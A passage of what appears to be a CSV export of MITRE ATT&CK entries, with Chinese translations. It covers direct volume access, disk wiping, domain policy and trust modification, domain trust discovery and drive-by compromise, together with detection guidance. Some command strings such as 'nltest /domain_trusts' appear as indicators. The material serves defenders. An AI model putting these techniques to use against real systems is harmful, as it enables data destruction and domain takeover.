与合法的开发工作一样，开发恶意软件可能需要不同的技能。所需的技能可能位于内部，也可能需要外包。使用承包商可被视为该对手恶意软件开发能力的扩展，前提是该对手在制定需求方面发挥作用并保持对恶意软件的一定程度的排他性。恶意软件开发的某些方面，例如 C2 协议开发，可能需要攻击者获得额外的基础设施。例如，为 C2 与 Twitter 通信的恶意软件可能需要使用 [Web 服务](https://attack.mitre.org/techniques/T1583/006)。（引用：FireEye APT29）
T1006,Direct Volume Access,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)",https://attack.mitre.org/techniques/T1006,31 May 2017,09 February 2021,2.0,Defense Evasion,"Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)

Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging of PowerShell scripts is recommended.",Windows,"Command: Command Execution, Drive: Drive Access",False,,"File monitoring, File system access controls",,Administrator,,,,,,",",直接存取卷/直接访问逻辑卷,攻击者可以直接访问卷以绕过文件访问控制和文件系统监控。 Windows 允许程序直接访问逻辑卷。具有直接访问权限的程序可以通过分析文件系统数据结构直接从驱动器读取和写入文件。这种技术绕过了 Windows 文件访问控制以及文件系统监控工具。 （引用：Hakobyan 2009）NinjaCopy 等实用程序可用于在 PowerShell 中执行这些操作。 （引用：Github PowerSploit Ninjacopy）
T1561,Disk Wipe,"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1561,20 February 2020,28 July 2022,1.0,Impact,"Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.","Linux, Windows, macOS","Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation",False,,,,,,,,Availability,,",(Citation: Ready.gov IT DRP)",磁盘擦除,攻击者可能会擦除或破坏特定系统或网络中大量的原始磁盘数据，以中断系统和网络资源的可用性。通过对磁盘的直接写访问，攻击者可能会尝试覆盖部分磁盘数据。攻击者可能会选择擦除磁盘数据的任意部分和/或擦除主引导记录 (MBR) 等磁盘结构。可能会尝试完全擦除所有磁盘扇区。为了在以网络范围的可用性中断为目标的操作中最大限度地影响目标组织，用于擦除磁盘的恶意软件可能具有类似蠕虫的功能，通过利用 [有效帐户](https://attack) 等其他技术在网络中传播.mitre.org/techniques/T1078)、[操作系统凭证转储](https://attack.mitre.org/techniques/T1003) 和 [SMB/Windows 管理员共享](https://attack.mitre.org/技术/T1021/002）。（引用：Novetta Blockbuster 破坏性恶意软件）
T1561.001,Disk Wipe: Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.

Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1561/001,20 February 2020,28 July 2022,1.0,Impact,Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.,"Linux, Windows, macOS","Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation",True,T1561,,,,,,,Availability,,"(Citation: IBM MegaCortex),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Medium S2W WhisperGate January 2022),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Symantec Elfin Mar 2019),(Citation: Novetta Blockbuster Destructive Malware),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Ready.gov IT DRP)",磁盘擦除：磁盘内容擦除,攻击者可能会擦除特定系统上或网络中大量存储设备的内容，以中断系统和网络资源的可用性。攻击者可能会部分或完全覆盖存储设备的内容，使数据无法通过存储接口恢复。（引用：Novetta Blockbuster）（引用：Novetta Blockbuster Destructive Malware）（引用：DOJ Lazarus Sony 2018）而不是擦除特定的磁盘结构或文件，具有破坏性意图的对手可能会擦除磁盘内容的任意部分。为了擦除磁盘内容，攻击者可能会直接访问硬盘驱动器，以便用随机数据覆盖任意大小的磁盘部分。（引用：Novetta Blockbuster 破坏性恶意软件）已观察到攻击者利用第三方驱动程序，如 [RawDisk]（https ://attack.mitre.org/software/S0364) 直接访问磁盘内容。(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) 这种行为不同于[数据破坏](https://attack.mitre .org/techniques/T1485），因为磁盘的部分被擦除而不是单个文件。在以网络范围的可用性中断为目标的操作中，为了最大限度地影响目标组织，用于擦除磁盘内容的恶意软件可能具有类似蠕虫的功能，通过利用 [有效帐户](https:// attack.mitre.org/techniques/T1078)、[操作系统凭据转储](https://attack.mitre.org/techniques/T1003) 和 [SMB/Windows 管理员共享](https://attack.mitre.org /techniques/T1021/002)。（引用：Novetta Blockbuster 破坏性恶意软件）
T1561.002,Disk Wipe: Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. 

Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.

To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",https://attack.mitre.org/techniques/T1561/002,20 February 2020,28 March 2020,1.0,Impact,Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.,"Linux, Windows, macOS","Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation",True,T1561,,,"Administrator, root, SYSTEM, User",,,,Availability,,"(Citation: Symantec Elfin Mar 2019),(Citation: Talos Group123),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Crowdstrike WhisperGate January 2022),(Citation: US-CERT Ukraine Feb 2016),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Unit 42 Shamoon3 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: FireEye Shamoon Nov 2016),(Citation: Symantec Shamoon 2012),(Citation: Cisco CaddyWiper March 2022),(Citation: Trend Micro KillDisk 1),(Citation: ESET CaddyWiper March 2022),(Citation: Microsoft WhisperGate January 2022),(Citation: US-CERT SHARPKNOT June 2018),(Citation: FireEye APT38 Oct 2018),(Citation: Novetta Blockbuster),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Cybereason WhisperGate February 2022),(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET Telebots June 2017),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Symantec Ukraine Wipers February 2022),(Citation: FireEye APT37 Feb 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Ready.gov IT DRP)",磁盘擦除：磁盘结构擦除,攻击者可能会破坏或擦除引导系统所需的硬盘驱动器上的磁盘数据结构；针对特定的关键系统或网络中的大量系统，以中断系统和网络资源的可用性。攻击者可能会试图通过覆盖位于主引导记录 (MBR) 或分区表等结构中的关键数据来使系统无法启动。（引文：Symantec Shamoon 2012）（引文：FireEye Shamoon 2016 年 11 月）（引文：Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) 磁盘结构中包含的数据可能包括用于加载操作系统的初始可执行代码或磁盘上文件系统分区的位置。如果此信息不存在，计算机将无法在引导过程中加载操作系统，从而使计算机不可用。 [磁盘结构擦除](https://attack.mitre.org/techniques/T1561/002) 可以单独执行，也可以与[磁盘内容擦除](https://attack.mitre.org/techniques/T1561) 一起执行/001) 如果磁盘的所有扇区都被擦除。为了最大限度地影响目标组织，设计用于破坏磁盘结构的恶意软件可能具有类似蠕虫的功能，可通过利用其他技术（如 [有效帐户](https://attack.mitre.org/techniques/T1078)）在网络中传播， [操作系统凭据转储](https://attack.mitre.org/techniques/T1003) 和 [SMB/Windows 管理员共享](https://attack.mitre.org/techniques/T1021/002)。（引用： Symantec Shamoon 2012）（引用：FireEye Shamoon 2016 年 11 月）（引用：Palo Alto Shamoon 2016 年 11 月）（引用：卡巴斯基 StoneDrill 2017）
T1484,Domain Policy Modification,"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.

With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).

Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",https://attack.mitre.org/techniques/T1484,07 March 2019,09 February 2021,2.0,"Defense Evasion, Privilege Escalation","It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)(Citation: Microsoft 365 Defender Solorigate) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)

Consider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings.(Citation: Microsoft - Update or Repair Federated domain) Some domain policy modifications, such as changes to federation settings, are likely to be rare.(Citation: Microsoft 365 Defender Solorigate)","Azure AD, Windows","Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Command: Command Execution",False,,"File system access controls, System access controls",,"Administrator, User",,,,,,",(Citation: Wald0 Guide to GPOs),(Citation: Microsoft WMI Filters),(Citation: Microsoft GPO Security Filtering),(Citation: GitHub Bloodhound)",域策略修改,攻击者可能会修改域的配置设置以逃避防御和/或提升域环境中的权限。域提供了一种集中方式来管理计算机资源（例如：计算机、用户帐户）如何在网络上运行并相互交互。域的策略还包括可以在多域/林环境中的域之间应用的配置设置。对域设置的修改可能包括更改域组策略对象 (GPO) 或更改域的信任设置，包括联合信任。有了足够的权限，攻击者就可以修改域策略设置。由于域配置设置控制 Active Directory (AD) 环境中的许多交互，因此存在大量可能源自这种滥用的潜在攻击。此类滥用的示例包括修改 GPO 以将恶意 [计划任务](https://attack.mitre.org/techniques/T1053/005) 推送到整个域环境中的计算机（引用：ADSecurity GPO Persistence 2016）（引用：Wald0 GPO 指南）（引文：Harmj0y 滥用 GPO 权限）或修改域信任以包含攻击者控制的域，在该域中他们可以控制随后将被受害者域资源接受的访问令牌。（引文：Microsoft - 最近民族国家的客户指南网络攻击）攻击者还可以更改 AD 环境中的配置设置以实施 [Rogue Domain Controller]（https://attack.mitre.org/techniques/T1207）。攻击者可能会临时修改域策略，执行恶意操作，然后恢复更改以删除可疑指标。
T1484.002,Domain Policy Modification: Domain Trust Modification,"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.

Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) ",https://attack.mitre.org/techniques/T1484/002,28 December 2020,21 October 2022,1.1,"Defense Evasion, Privilege Escalation","Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)

Monitor for PowerShell commands such as: <code>Update-MSOLFederatedDomain –DomainName: ""Federated Domain Name""</code>, or <code>Update-MSOLFederatedDomain –DomainName: ""Federated Domain Name"" –supportmultipledomain</code>.(Citation: Microsoft - Update or Repair Federated domain)","Azure AD, Windows","Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Command: Command Execution",True,T1484,,"Blake Strom, Microsoft 365 Defender; Praetorian",Administrator,,,,,,"(Citation: Secureworks IRON RITUAL Profile),(Citation: Microsoft 365 Defender Solorigate),(Citation: Azure AD Federation Vulnerability),(Citation: AADInternals Documentation),",域策略修改：域信任修改,攻击者可能会添加新的域信任或修改现有域信任的属性以逃避防御和/或提升特权。域信任详细信息，例如域是否联合，允许在域之间应用身份验证和授权属性以访问共享资源。（引用：Microsoft - Azure AD 联合）这些信任对象可能包括帐户、凭据和应用于服务器、令牌和域的其他身份验证材料。操纵域信任可能允许攻击者通过修改设置以添加他们控制的对象来提升特权和/或逃避防御。例如，这可用于伪造 [SAML 令牌](https://attack.mitre.org/techniques/T1606/002)，而无需破坏签名证书来伪造新凭证。相反，攻击者可以操纵域信任来添加他们自己的签名证书。攻击者还可以将域转换为联合域，这可能会启用恶意信任修改，例如更改声明发布规则以以指定用户身份登录任何有效的凭据集。（引用：AADInternals zure AD 联合域）
T1484.001,Domain Policy Modification: Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) 

Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.

Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)

For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",https://attack.mitre.org/techniques/T1484/001,28 December 2020,09 February 2021,1.0,"Defense Evasion, Privilege Escalation","It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:

* Event ID 5136 - A directory service object was modified
* Event ID 5137 - A directory service object was created
* Event ID 5138 - A directory service object was undeleted
* Event ID 5139 - A directory service object was moved
* Event ID 5141 - A directory service object was deleted


GPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).",Windows,"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Command: Command Execution",True,T1484,,"Itamar Mizrahi, Cymptom; Tristan Bennett, Seamless Intelligence","Administrator, User",,,,,,"(Citation: ESET Hermetic Wizard March 2022),(Citation: Check Point Meteor Aug 2021),(Citation: Crowdstrike Indrik November 2018),(Citation: Intrinsec Egregor Nov 2020),(Citation: Cybereason Egregor Nov 2020),(Citation: Github PowerShell Empire),(Citation: Wald0 Guide to GPOs),(Citation: Microsoft WMI Filters),(Citation: Microsoft GPO Security Filtering),(Citation: GitHub Bloodhound)",域策略修改：组策略修改,"攻击者可能会修改组策略对象 (GPO) 以破坏域的预期自主访问控制，通常是为了提升域的权限。组策略允许集中管理 Active Directory (AD) 中的用户和计算机设置。 GPO 是组策略设置的容器，由存储在可预测的网络路径 <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code> 中的文件组成。（引用：TechNet 组策略基础）（引用：ADSecurity GPO Persistence 2016）与 AD 中的其他对象一样，GPO 具有与之关联的访问控制。默认情况下，域中的所有用户帐户都有权读取 GPO。可以将 GPO 访问控制权限（例如写入权限）委派给域中的特定用户或组。恶意 GPO 修改可用于实现许多其他恶意行为，例如 [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)、[Disable or Modify Tools](https://attack.mitre .org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [创建账户](https://attack.mitre.org/techniques/T1136) , [Service Execution](https://attack.mitre.org/techniques/T1569/002), 等等。(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPO)(引用: Harmj0y Abusing GPO Permissions) （引用：Mandiant M Trends 2016）（引用：Microsoft Hacking Team Breach）由于 GPO 可以控制 AD 环境中的大量用户和机器设置，因此这种 GPO 滥用可能引发大量潜在攻击。（引用： Wald0 GPO 指南）例如，可以利用诸如 <code>New-GPOImmediateTask</code> 等公开可用的脚本来自动创建恶意 [Scheduled Task/Job](https://attack.mit re.org/techniques/T1053）通过修改 GPO 设置，在这种情况下修改 <code><GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>。（引用：Wald0 GPO 指南）（引用： Harmj0y 滥用 GPO 权限）在某些情况下，攻击者可能会修改特定的用户权限，例如在 <code><GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code> 中设置的 SeEnableDelegationPrivilege，以实现微妙的 AD具有完全控制域的后门，因为在对手控制下的用户帐户将能够修改 GPO。（引用：Harmj0y SeEnableDelegationPrivilege Right）"
T1482,Domain Trust Discovery,"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",https://attack.mitre.org/techniques/T1482,14 February 2019,16 June 2022,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)
",Windows,"Command: Command Execution, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation, Script: Script Execution",False,,,"Dave Westgard; Elia Florio, Microsoft; ExtraHop; Mnemonic; RedHuntLabs, @redhuntlabs",,,,,,,"(Citation: Cyberreason Anchor December 2019),(Citation: FireEye FIN6 Apr 2019),(Citation: Volexity SolarWinds),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Github PowerShell Empire),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: NCC Group Team9 June 2020),(Citation: Symantec Bumblebee June 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky QakBot September 2021),(Citation: GitHub PowerSploit May 2012),(Citation: Bitdefender FIN8 July 2021),(Citation: Nltest Manual),(Citation: Cybereason Bazar July 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: GitHub PoshC2),(Citation: PowerSploit Documentation),(Citation: NCC Group Chimera January 2021),(Citation: Harmj0y Domain Trusts),(Citation: Fortinet TrickBot),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike BloodHound April 2018),(Citation: Harmj0y Domain Trusts)",域信任发现,攻击者可能会尝试收集有关域信任关系的信息，这些信息可用于识别 Windows 多域/林环境中的横向移动机会。域信任为域提供了一种机制，允许基于另一个域的身份验证过程访问资源。（引用：Microsoft 信任）域信任允许受信任域的用户访问信任域中的资源。发现的信息可能有助于攻击者进行 [SID-History Injection](https://attack.mitre.org/techniques/T1134/005)、[Pass the Ticket](https://attack.mitre.org/techniques/ T1550/003) 和 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)。(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) 可以使用` DSEnumerateDomainTrusts()` Win32 API 调用、.NET 方法和 LDAP。（引用：Harmj0y 域信任）Windows 实用程序 [Nltest](https://attack.mitre.org/software/S0359) 已知被对手使用枚举域信任。（引用：Microsoft Operation Wilysupply）
T1189,Drive-by Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).

Multiple ways of delivering exploit code to a browser exist, including:

* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
* Malicious ads are paid for and served through legitimate ad providers.
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.

Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)",https://attack.mitre.org/techniques/T1189,18 April 2018,08 March 2022,1.4,Initial Access,"Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.

Network intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.

Detecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","Linux, SaaS, Windows, macOS","Application Log: Application Log Content, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation",False,,,"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)",User,,,,,,"(Citation: CSM Elderwood Sept 2012),(Citation: Talos Transparent Tribe May 2021),(Citation: Secureworks REvil September 2019),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: IBM Grandoreiro April 2020),(Citation: ESET Bad Rabbit),(Citation: McAfee Sodinokibi October 2019),(Citation: Secure List Bad Rabbit),(Citation: Symantec Tick Apr 2016),(Citation: Picus Sodinokibi January 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Securelist LuckyMouse June 2018),(Citation: RATANKBA),(Citation: Volexity Ocean Lotus November 2020),(Citation: ESET Buhtrap and Buran April 2019),(Citation: Secureworks GandCrab and REvil September 